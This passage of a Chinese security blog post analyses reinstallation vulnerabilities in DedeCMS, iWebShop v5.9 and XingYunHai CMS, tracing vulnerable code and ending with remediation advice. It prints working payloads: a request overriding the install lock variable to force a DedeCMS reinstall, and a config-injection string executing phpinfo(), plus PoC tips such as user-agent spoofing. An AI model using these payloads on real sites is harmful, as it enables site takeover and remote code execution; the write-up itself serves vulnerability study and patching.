            //        file_put_contents('./App/Common/Conf/config.php', $conf);
            //        file_put_contents('./App/User/Conf/config.php', $user);
            //        return '';
            //    }
            //}
            register_administrator($db, $temp_info['db_prefix'], $temp_info, $auth);
             $this->_show_process('注册创始人帐号成功');
             //锁定安装程序
            touch('./Data/install.lock');
            ...
来看 sqldata 下的配置内容：
user.tpl
     参考 [Apache解析漏洞详解 – milantgh – 博客园
> (cnblogs.com)](https://www.cnblogs.com/milantgh/p/5116955.html)
>
> 并非网上所说的“低版本的 Apache 存在未知扩展名解析漏洞”。
>
> 应该是使用 module 模式与 php 结合的所有版本 Apache 存在未知扩展名解析漏洞，使用 fastcgi 模式与 php 结合的所有版本
> Apache 不存在此漏洞。并且，想利用此漏洞必须保证文件扩展名中至少带有一个 .php ，否则将默认被作为 txt/html 文档处理。
另外，这也就要求利用前 install 文件夹本身没有被删除。
我们先执行安装一次，可见 /install 目录下已经有了 index.php 的备份 .bak 文件以及 lock 文件：
直接访问安装页面会提示已经安装：
接下来我们来看 index.php.bak 文件，对其进行分析：
     $_v) ${$_k} = RunMagicQuotes($_v);
    }
    // RunMagicQuotes 这个过滤函数主要是为了防注入，对于一般字符串并没有什么作用
    // install/install.inc.php 
    //function RunMagicQuotes(&$str)
    //{
    //    if(!get_magic_quotes_gpc()) {
    //        if( is_array($str) )
    //            foreach($str as $key => $val) $str[$key] = RunMagicQuotes($val);
    //        else
    //            $str = addslashes($str);
    //    }
    //    return $str;
    //}
    require_once(DEDEINC.'/common.func.php');
    // （2）这判断 $insLockfile 这个变量值（即 lock 文件“正确”的绝对路径）是否存在 lock 文件，如果不存在则可重装。
    if(file_exists($insLockfile))
    {
        exit(" 程序已运行安装，如果你确定要重新安装，请先从FTP中删除 install/install_lock.txt！");
    }
    if(empty($step))
    {
        $step = 1;
    }
    ...
由上代码注释中的 3 点分析，我们可以这样构造 payload（参照法师前辈的）：
    http://www.localhost.com/install/index.php.bak?insLockfile=snovving&step=4
    POST
    step=4&dbhost=localhost&dbuser=root&dbpwd=123456&dbprefix=dede_&dbname=dedecms1&dblang=gbk&adminuser=admin&adminpwd=admin&cookieencode=JzIVw7439H&webname=%CE%D2%B5%C4%CD%F8%D5%BE&adminmail=admin%40dedecms.com&baseurl=http%3A%2F%2Flocalhost&cmspath=%2Fdedecms
step 4 对应 step 3 填写完数据后的安装过程，这样即可重装成功。
因为漏洞太过古早，phpstudy 早已没有相对应 Apache 的版本可供实现，所以仅在理论上梳理了一遍此漏洞，接下来对比 Dedecms 补丁后的
SP1 是如何修复此漏洞的：
如图使用了 define 定义为常量，也就无法通过传参来利用变量覆盖了。
最后学习一下 [DedeCMS 5.7通用重装漏洞 + PoC分析 – BT’s blog
(bt7k.com)](https://bt7k.com/?p=26) 的技巧优化点，列在这方便查阅：
>   1. $insLockfile 值最好用随机数，防止 /install 目录下恰巧有这个文件。
>   2. 漏洞点是 index.php、index.php.bak文件，可以用字典试一下（ Apache 的解析漏洞实在很少了）。
>   3. 判断响应包时建议找全版本通用的固定出现的字符串，并选出多个 verify_key ，逐个判断，杜绝误报。
>   4. user-agent 最好伪造。
>
这种类型还在 XDCMS v1.0 中出现过。
###  iWebShop v5.9.21010 重装漏洞导致 RCE
参考 [iWebShop开源商城系统V5.9.21010存在命令执行漏洞_Y4tacker的博客-CSDN博客](https://blog.csdn.net/solitudi/article/details/118029055)
，复现学习一下，师傅本人写的已经很清楚了，在这仅进行一些补充，我觉得这是个很好的例子，这涉及到了利用其他漏洞删除 lock 文件来重装。
其实重装漏洞只要删除 install 文件基本没那么多事了。
首先进行前置工作，我们先登录后台，在 会员->商户管理->添加商户 处添加一个商户。
然后再在首页的商家管理处登录。
随便添加一个商品。
添加之后回到后台，对这三个表进行备份，并下载备份文件：
对备份文件进行如下修改：
很简单可以看到 iwebshop_goods 和 iwebshop_goods_photo 是通过一个中间表
iwebshop_goods_photo_relation 连接起来的，iwebshop_goods 的 id 从
iwebshop_goods_photo_relation 查找到 iwebshop_goods_photo 表对应的图片 id 。
这里的 2 对应的就是商品图片的 id ，无论修改为什么数字只要对应上就好，原来是图片的 md5 值，这里为了方便演示改为了 2 ，并且把商品图片的路径从
uploads/xxx.jpg 改为 lock 文件的目录即可。
这时候 /install 目录下的 lock 文件还在。
修改后再在后台进行本地导入，成功后回到商家管理界面删除我们刚才添加的商品。
删除后再看 lock 文件已经作为该商品的“图片”一并删除了：
这样我们再次访问安装页面即可重装，接下来也是常规的找能写入配置文件的数据闭合达到 RCE 的目的。
payload：
    hacktest','snovving'=>phpinfo()))))?>
安装完成后访问前台：
接下来我们来看代码层面是什么样的。
首先看导致任意文件删除部分，对应后台上传备份文件的地方，找到相应控制器部分：
controllers/tools.php
classes/dbbackup.php 中 parseSQL 对备份文件进行解析时，根据截取的前 2 字符判断SQL类型：
而我们之前下载的备份文件是以 `DROP TABLE IF EXISTS iwebshop_goods;` 开头，进入默认分支：
可以看到只对进入分支的每行数据添加了 `;` 来分句，并无其他过滤。
而上传完备份文件后，我们来看商家管理删除商品的部分。
controllers/seller.php
跟进 del ：
classes/goods_class.php
对删除的文件也没有任何限制就直接 unlink 删除了。
关于寻找配置信息构造闭合的部分，可以从 install/index.php 入手。
install/include/function.php
跟踪 create_config ：
可以看到没有任何过滤。
构造部分，可以参照与 config.php 默认的模板文件：
db_name 是最后的参数，且是我们可控的，我们可以利用这个传入 phpinfo 并闭合前面 array 并添加 php 文件结尾避免后面的 `')`
等字符干扰，就得到 payload ：
    hacktest','snovving'=>phpinfo()))))?>
因为后台修改商品导致任意文件删除导致重装还有 WFPHP 也曾经存在这个问题。
###  行云海 CMS 重装漏洞
tp 框架，先安装一遍。
一般任意文件删除可以用 Seay 或者全局搜索 unlink 发现，审计整个项目的时候可以从一些公共类文件入手（比如放在什么 /inc 文件目录下的或名称有
.class 的），更别说是数据库相关的方法了，这次的漏洞就在于：
App/Manage/Controller/DatabaseController.class.php
也是对删除文件没有限制就删除了。
路径：
登录后台，找到了数据库管理模块（这里其实对 tp 框架路由有了解的直接访问 s=/Database/方法 即可 ）
随便给几个表备份一下，这里我们利用 POST 传递 lock 文件的路径（关于这个个人习惯是 POST 最好利用，因为 GET 有 URL
编码限制，请求提交的数据还有长度限制，很多时候比不上 POST 方便安全，当然这里也可以通过 GET 发送 payload，一般 GET 只读，而 POST
写），我们在批量删除的时候抓包复制下 url 。
根据目录改成 lock 文件相对的路径再发包即可。
前台删除导致重装的可以参考一下天目 MVC Home 版 T2.13 的重装漏洞。
## 修复建议&一些思考
1.正确处理 lock 文件  
2.判断安装完成后要退出  
3.在安装的每一步都要进行验证  
4.所有输入点都要进行过滤，特别涉及到数据库的操作  
5.最后的最后，就是删除 /install 文件，多看看安装后的温馨提示
另外实际渗透中，涉及一些重要数据还是不要利用重装漏洞，毕竟最珍贵的还是数据。